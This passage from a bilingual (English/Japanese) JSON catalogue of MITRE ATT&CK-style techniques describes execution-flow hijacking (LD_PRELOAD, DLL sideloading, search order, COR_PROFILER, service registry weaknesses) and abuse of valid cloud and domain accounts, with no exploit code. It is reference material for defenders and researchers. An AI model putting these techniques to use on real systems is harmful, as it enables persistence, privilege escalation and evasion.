                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library’s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation: Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024)\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",
                        "description_jp": "攻撃者は、ダイナミックリンカーが共有ライブラリをロードするために使用する環境変数をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。プログラムの実行準備段階で、ダイナミックリンカーは、Linux の <code>LD_PRELOAD</code> や macOS の <code>DYLD_INSERT_LIBRARIES</code> など、さまざまな環境変数やファイルから共有ライブラリの指定された絶対パスをロードします。(引用: TheEvilBit DYLD_INSERT_LIBRARIES)(引用: Timac DYLD_INSERT_LIBRARIES)(引用: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) 環境変数で指定されたライブラリは、同じ関数名のシステムライブラリよりも優先して最初にロードされます。(引用: Man LD.SO)(引用: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) 各プラットフォームのリンカーは、実行のさまざまな時点で環境変数の広範なリストを使用します。これらの変数は、開発者が再コンパイルすることなくバイナリをデバッグしたり、マップされたシンボルの競合を解除したり、元のライブラリにカスタム関数を実装したりするために、しばしば使用される(引用: Baeldung LD_PRELOAD)\n\nダイナミック・リンカー変数をハイジャックすると、被害者プロセスのメモリ、システム/ネットワーク・リソースへのアクセスが許可され、特権が昇格する可能性があります。Linux では、敵対者は <code>LD_PRELOAD</code> を設定して、被害者プログラムによって要求された正当なライブラリの名前と一致する悪意のあるライブラリを指すようにし、被害者プログラムの実行時にオペレーティングシステムに敵対者の悪意のあるコードをロードさせる可能性があります。例えば、敵は <code>LD_PRELOAD</code> を使って <code>sshd</code> デーモンのすべての子孫プロセスに悪意のあるライブラリを注入し、結果として正規のプロセスで実行させる。実行中のサブプロセスが <code>execve</code> 関数を呼び出すと、ディスク上のシステムライブラリに含まれるシステム関数 <code>execve</code> ではなく、悪意のあるライブラリの <code>execve</code> 関数が実行される。<code>execve</code>や<code>readdir</code>などのシステム関数をフックすることで、マルウェアが<code>ls</code>、<code>ldd</code>、<code>iptables</code>、<code>dmesg</code>などのコマンドの結果から自身のアーティファクトをスクラブすることが可能になるため、敵対者は検出から[アーティファクトを隠す](https://attack.mitre.org/techniques/T1564)ことができる(引用：ESET Ebury Oct 2017)(引用：Intezer Symbiote 2022)(引用：Elastic Security Labs Pumakit 2024)\n\n動的リンカー変数をハイジャックすることで、被害者プロセスのメモリ、システム/ネットワークリソースへのアクセスが許可され、特権が昇格する可能性があります。"
                    },
                    {
                        "id": "T1574.014",
                        "name_eng": "AppDomainManager",
                        "name_jp": "AppDomainManager",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code.(Citation: Microsoft App Domains) \n\nKnown as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.(Citation: PenTestLabs AppDomainManagerInject)(Citation: PwC Yellow Liderc)(Citation: Rapid7 AppDomain Manager Injection)",
                        "description_jp": "攻撃者は、.NET の `AppDomainManager` がアセンブリをロードする方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。.NETフレームワークは、`AppDomainManager`クラスを使用して、.NETアプリケーションの実行をホストするプロセス内に1つ以上の隔離された実行環境（アプリケーションドメインと呼ばれる）を作成し、管理します。アセンブリ（.NETコードとして実行するためにコンパイルされた`.exe`または`.dll`バイナリ）は、実行可能コードとしてアプリケーションドメインにロードすることができる（引用：Microsoft App Domains）。\n\n「AppDomainManagerインジェクション」として知られるこの攻撃は、.NETアプリケーションがアセンブリをロードする方法をハイジャックすることで、任意のコードを実行する可能性があります。例えば、マルウェアはターゲットプロセス内にカスタムアプリケーションドメインを作成し、任意のアセンブリをロードして実行します。あるいは、.NET ランタイム設定を定義する設定ファイル (`.config`) やプロセス環境変数が改ざんされ、悪意のあるアセンブリ (名前で識別される) をターゲットプロセスにロードするよう、良性の .NET アプリケーションに指示することもあります。(引用: PenTestLabs AppDomainManagerInject)(引用: PwC Yellow Liderc)(引用: Rapid7 AppDomain Manager Injection)"
                    },
                    {
                        "id": "T1574.001",
                        "name_eng": "DLL",
                        "name_jp": "DLL",
                        "description_eng": "Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)\n\nSpecific ways DLLs are abused by adversaries include:\n\n### DLL Sideloading\nAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).\n\nSide-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.\n\nAdversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)\n\n### DLL Search Order Hijacking\nAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)\n\n### DLL Redirection\nAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)\n\n### Phantom DLL Hijacking\nAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)\n\n### DLL Substitution\nAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)\n\nPrograms that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.\n\nRemote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)\n\nIf a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",
                        "description_jp": "攻撃者は、永続性を実現し、特権を昇格させ、防御を回避するために、ダイナミック・リンク・ライブラリ・ファイル（DLL）を悪用する可能性がある。DLLは、複数のプログラムで同時に利用できるコードとデータを含むライブラリである。DLLは本来悪意のあるものではないが、サイドローディング、検索順序の乗っ取り、ファントムDLLハイジャックなどのメカニズムによって悪用される可能性がある(引用：unit 42)。\n\nDLLが敵対者によって悪用される具体的な方法には、次のようなものがある：\n\n### DLL サイドローディング\nDLLのサイドローディング 敵は、DLLをサイドローディングすることで、独自の悪意のあるペイロードを実行する可能性があります。サイドローディングは、プログラムがロードする DLL を植え付け、ペイロードを実行する正規のアプリケーションを起動することで、DLL を乗っ取ることを意味します。\n\nサイドローディングは、被害者アプリケーションと悪意のあるペイロードの両方を、互いに隣り合わせに配置します。攻撃者はサイドローディングを、正規の、信頼された、潜在的に昇格されたシステムまたはソフトウェアプロセスの下で実行するアクションを隠す手段として使用している可能性が高いです。ペイロードのサイドローディングに使用される良性の実行ファイルは、配信中や実行中にフラグが立てられない可能性があります。敵対的なペイロードは、信頼されたプロセスのメモリにロードされるまで、暗号化/パックされるか、または他の方法で難読化される可能性もあります。\n\n攻撃者は、BPL (Borland Package Library) などの他のパッケージをサイドロードすることもあります(引用: kroll bpl)。\n\n### DLL 検索順序のハイジャック\n攻撃者は、Windows が DLL をロードする際に使用する検索順序をハイジャックすることで、独自の悪質なペイロードを実行する可能性があります。この検索順序は、DLL をロードする際にプログラムがチェックする、特別な検索場所と標準的な検索場所のシーケンスです。敵対者は、DLLの検索順序によって正当なライブラリの場所よりも優先されるディレクトリに、トロイの木馬のDLLを仕込むことができる。これにより、被害者プログラムによって悪意のあるDLLが呼び出されると、Windowsはそれをロードするようになる(引用：unit 42)。\n\n### DLL リダイレクト\nDLLリダイレクトは、有効化された後（レジストリまたはリダイレクトファイルの作成により）、プログラムに別の場所からDLLをロードさせる可能性があります。 引用：Microsoft リダイレクト）（引用：Microsoft - manifests/assembly\n\n### ファントム DLL ハイジャック\n攻撃者は、存在しない DLL ファイルへの参照を標的とすることで、ファントム DLL ハイジャックを利用する可能性があります。彼らは、存在しないモジュールの場所に正しい名前で悪意のある DLL を仕込むことで、独自の悪意のある DLL をロードできる可能性があります(引用: Hexacorn DLL ハイジャック)(引用: Hijack DLLs CrowdStrike)\n\n### DLL の置換\n攻撃者は、既存の有効な DLL ファイルを標的にし、有効な DLL ファイルと同じ名前と同じ場所に、自分自身の悪意のある DLL を植え付けることで、DLL を置き換える可能性があります(引用: Wietze Beukema DLL ハイジャック)。\n\nDLLハイジャックの被害に遭ったプログラムは、悪意のあるDLLが正規のDLLも読み込むように設定されているため、防御を回避して正常に動作しているように見えることがある。\n\nリモートDLLハイジャックは、DLLをロードする前にプログラムがカレントディレクトリをWeb共有などのリモートの場所に設定することで発生する可能性がある(引用：DLL pre load owasp)(引用：Microsoft remote preloading)\n\n有効なDLLがより高い特権レベルで実行されるように設定されている場合、ロードされる敵に制御されたDLLもより高いレベルで実行される。この場合、このテクニックは特権の昇格に使われる可能性がある。"
                    },
                    {
                        "id": "T1574.008",
                        "name_eng": "Path Interception by Search Order Hijacking",
                        "name_jp": "検索順ハイジャックによるパスインターセプション",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).",
                        "description_jp": "攻撃者は、他のプログラムのロードに使用される検索順序をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。プログラムによってはフルパスで他のプログラムを呼び出さないものもあるため、敵は呼び出し元のプログラムがあるディレクトリに自分のファイルを置き、呼び出し元のプログラムの要求に応じてオペレーティングシステムが悪意のあるソフトウェアを起動するように仕向ける可能性があります。\n\n検索順序のハイジャックは、敵対者がWindowsがパスを与えられていないプログラムを検索する順序を悪用することで発生する。[DLL](https://attack.mitre.org/techniques/T1574/001)の検索順ハイジャックとは異なり、検索順はプログラムの実行に使用されるメソッドによって異なります。(引用: Microsoft CreateProcess) (引用: Windows NT Command Shell) (引用: Microsoft WinExec) しかし、WindowsはWindowsシステムディレクトリを検索する前に、開始プログラムのディレクトリを検索するのが一般的である。検索順序のハイジャックに対して脆弱なプログラム（すなわち、実行可能ファイルへのパスを指定しないプログラム）を見つけた敵対者は、不適切に指定されたプログラムにちなんだ名前のプログラムを作成し、それを開始プログラムのディレクトリ内に配置することによって、この脆弱性を利用することができる。\n\n例えば、「example.exe」はコマンドライン引数<code>net user</code>で「cmd.exe」を実行します。攻撃者がexample.exeと同じディレクトリに「net.exe」というプログラムを置くと、「net.exe」はWindowsのシステムユーティリティnetの代わりに実行されます。さらに、攻撃者が「net.com」というプログラムを「net.exe」と同じディレクトリに置いた場合、PATHEXTで定義された実行可能拡張子の順序により、<code>cmd.exe /C net user</code>は「net.exe」の代わりに「net.com」を実行します。(引用: Microsoft Environment Property)\n\n検索順のハイジャックもDLLのロードをハイジャックするための一般的な方法で、[DLL](https://attack.mitre.org/techniques/T1574/001)でカバーされています。"
                    },
                    {
                        "id": "T1574.011",
                        "name_eng": "Services Registry Permissions Weakness",
                        "name_jp": "サービスレジストリアクセス許可の脆弱性",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                        "description_jp": "攻撃者は、サービスが使用するレジストリ・エントリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性がある。攻撃者は、サービスに関連するレジストリ キーのパーミッションの欠陥を利用して、サービスの起動時に独自のコードを起動するために、本来指定されている実行可能ファイルから自分たちが制御する実行可能ファイルへとリダイレクトする可能性がある。Windowsは、レジストリの<code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>の下にローカルサービスのコンフィギュレーション情報を格納します。サービスのレジストリキーの下に格納された情報は、サービスコントローラー、sc.exe、 [PowerShell](https://attack.mitre.org/techniques/T1059/001)、または[Reg](https://attack.mitre.org/software/S0075)のようなツールを使って、サービスの実行パラメーターを変更するために操作することができる。レジストリ・キーへのアクセスは、アクセス制御リストとユーザー権限によって制御される。(引用：レジストリキーのセキュリティ）（引用：malware_hides_service）\n\nユーザーやグループのパーミッションが適切に設定されておらず、サービスのレジストリ・キーへのアクセスを許可している場合、敵対者はサービスのbinPath/ImagePathを変更し、自分のコントロール下にある別の実行ファイルを指すようにする可能性があります。サービスが開始または再起動されると、敵が制御するプログラムが実行され、サービスが実行されるように設定されたアカウントコンテキスト（ローカル/ドメインアカウント、SYSTEM、LocalService、またはNetworkService）への永続化および/または特権昇格が可能になります。\n\n逆境者はまた、サービスのレジストリツリー内の他のレジストリキーを変更する可能性があります。たとえば、<code>FailureCommand</code>キーが変更され、サービスに障害が発生したり、サービスが意図的に破損したりした場合に、いつでも昇格したコンテキストでサービスが実行されるようにすることができる。 (引用：Kansa サービス関連コレクター）（引用：Tweet Registry Perms Weakness)\n\n<code>Performance</code>キーには、ドライバ サービスのパフォーマンス DLL の名前と、DLL 内のいくつかのエクスポートされた関数の名前が含まれます。(引用: microsoft_services_registry_tree) <code>Performance</code> キーがまだ存在せず、敵に制御されたユーザーが <code>Create Subkey</code> 権限を持っている場合、敵はサービスのレジストリ ツリーに悪意のある DLL を指す <code>Performance</code> キーを作成する可能性があります。(引用: insecure_reg_perms)\n\nまた、ドライバ固有のデータを格納する <code>Parameters</code> キーや、その他のカスタム サブキーを悪意のあるサービスに追加して、永続性を確立したり、その他の悪意のある活動を可能にしたりすることもできます。(引用: microsoft_services_registry_tree)(引用: troj_zegost) さらに、敵対者が svchost.exe を使用して悪意のあるサービスを起動する場合、サービスのファイルは <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code> を使用して識別される可能性があります(引用: malware_hides_service)。"
                    },
                    {
                        "id": "T1574.012",
                        "name_eng": "COR_PROFILER",
                        "name_jp": "COR_PROFILER",
                        "description_eng": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",
                        "description_jp": "攻撃者は COR_PROFILER 環境変数を利用して、.NET CLR をロードするプログラムの実行フローを乗っ取る可能性があります。COR_PROFILERは.NET Frameworkの機能で、開発者は共通言語ランタイム（CLR）をロードする各.NETプロセスにロードされるアンマネージド（または.NETの外部）プロファイリングDLLを指定できます。これらのプロファイラーは、.NET CLRで実行されるマネージドコードを監視、トラブルシューティング、デバッグするために設計されています。(引用: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nCOR_PROFILER 環境変数は、さまざまなスコープ（システム、ユーザー、またはプロセス）で設定でき、その結果、影響力のレベルが異なります。システムおよびユーザー全体の環境変数スコープは、[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001) (COM) オブジェクトをプロファイラ DLL として登録できるレジストリで指定されます。プロセススコープCOR_PROFILERは、レジストリを変更することなくメモリ内に作成することもできます。.NET Framework 4からは、COR_PROFILER_PATH環境変数にDLLの場所が指定されていれば、プロファイリングDLLを登録する必要はありません（引用：Microsoft COR_PROFILER 2013年2月）。\n\n攻撃者はCOR_PROFILERを悪用して、CLRが呼び出されるたびにすべての.NETプロセスのコンテキストで悪意のあるDLLを実行する永続性を確立する可能性があります。また、COR_PROFILERは、被害者である.NETプロセスがより高い権限レベルで実行されている場合、権限の昇格（例：[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)）や、フックおよび[防御の阻害](https://attack.mitre.org/techniques/T1562).NETプロセスによって提供される。(引用: RedCanary Mockingbird 2020年5月)(引用: Red Canary COR_PROFILER 2020年5月)(引用: Almond COR_PROFILER 2019年4月)(引用: GitHub OmerYa Invisi-Shell)(引用: subTee .NET Profilers 2017年5月)"
                    }
                ]
            },
            {
                "id": "T1078",
                "name_eng": "Valid Accounts",
                "name_jp": "有効なアカウント",
                "description_eng": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、既存のアカウントの資格情報を取得して悪用する可能性があります。侵害された資格情報は、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、ネットワークデバイス、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。(引用: volexity_0day_sophos_FW) 侵害された資格情報は、攻撃者に特定のシステムに対する権限の昇格や、ネットワークの制限された領域へのアクセスを許可する可能性もあります。攻撃者は、これらの資格情報が提供する正当なアクセスと組み合わせてマルウェアやツールを使用しないことを選択し、その存在を検出することをより困難にする場合があります。\n\n場合によっては、攻撃者は非アクティブなアカウントを悪用することがあります。例えば、組織の一員ではなくなった個人に属するアカウントなどです。これらのアカウントを使用すると、元のアカウントユーザーが自分のアカウントで行われている異常なアクティビティを特定するために存在しないため、攻撃者は検出を回避できる可能性があります。(引用: CISA MFA PrintNightmare)\n\nシステムのネットワーク全体にわたるローカル、ドメイン、およびクラウドアカウントの権限の重複は懸念事項です。なぜなら、攻撃者はアカウントやシステムをまたいでピボットし、高レベルのアクセス（つまり、ドメインまたはエンタープライズ管理者）に到達して、エンタープライズ内で設定されたアクセス制御をバイパスできる可能性があるためです。(引用: TechNet Credential Theft)",
                "subtechniques": [
                    {
                        "id": "T1078.004",
                        "name_eng": "Cloud Accounts",
                        "name_jp": "クラウドアカウント",
                        "description_eng": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nService or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s to move laterally across the cloud environment.(Citation: SpecterOps Managed Identity 2022)",
                        "description_jp": "クラウド環境の有効なアカウントにより、攻撃者は初期アクセス、永続化、権限昇格、または防御回避を達成するためのアクションを実行できる可能性があります。クラウドアカウントとは、ユーザー、リモートサポート、サービス、またはクラウドサービスプロバイダーやSaaSアプリケーション内のリソースの管理のために組織によって作成および構成されたものです。クラウドアカウントはクラウド内にのみ存在することも、Windows Active Directoryなどの他のIDソースとの同期またはフェデレーションを通じてオンプレミスシステムとクラウド間でハイブリッド結合することもできます。(引用: AWS Identity Federation)(引用: Google Federating GC)(引用: Microsoft Deploying AD Federation)\n\nサービスアカウントまたはユーザーアカウントは、[ブルートフォース](https://attack.mitre.org/techniques/T1110)、[フィッシング](https://attack.mitre.org/techniques/T1566)、またはその他のさまざまな手段を通じて攻撃者の標的となり、環境へのアクセスを取得する可能性があります。フェデレーションまたは同期されたアカウントは、攻撃者がオンプレミスシステムとクラウド環境の両方に影響を与える経路となる可能性があります。たとえば、共有資格情報を利用して[リモートサービス](https://attack.mitre.org/techniques/T1021)にログオンするなどです。フェデレーション、同期、またはクラウド専用であるかどうかにかかわらず、特権の高いクラウドアカウントは、ハイブリッド結合されたデバイスでコマンドを実行するためにSaaSベースの[ソフトウェア展開ツール](https://attack.mitre.org/techniques/T1072)を利用することにより、オンプレミス環境へのピボットを可能にする場合もあります。\n\n攻撃者は、環境内での永続性を維持するために、侵害されたクラウドアカウントに長期間有効な[追加のクラウド資格情報](https://attack.mitre.org/techniques/T1098/001)を作成する可能性があります。このような資格情報は、多要素認証などのセキュリティ制御をバイパスするためにも使用される場合があります。\n\nクラウドアカウントはまた、環境内のさまざまな手段を通じて[一時的な昇格されたクラウドアクセス](https://attack.mitre.org/techniques/T1548/005)またはその他の権限を取得できる場合もあります。ロールの割り当てまたはロールの引き受けポリシーの誤構成により、攻撃者はこれらのメカニズムを使用して、アカウントの意図された範囲外の権限を利用できる可能性があります。このような過剰な特権を持つアカウントは、[クラウドAPI](https://attack.mitre.org/techniques/T1059/009)またはその他の方法を通じて、オンラインストレージアカウントおよびデータベースから機密データを収集するために使用される場合があります。たとえば、Azure環境では、攻撃者は関連するAzureリソースがアクセストークンを要求できるようにするAzure Managed Identitiesを標的にする可能性があります。Azure VMなどの管理対象IDがアタッチされたリソースを侵害することにより、攻撃者は[アプリケーションアクセストークンの窃取](https://attack.mitre.org/techniques/T1528)を行い、クラウド環境全体を横断的に移動できる可能性があります。(引用: SpecterOps Managed Identity 2022)"
                    },
                    {
                        "id": "T1078.002",
                        "name_eng": "Domain Accounts",
                        "name_jp": "ドメインアカウント",
                        "description_eng": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.",
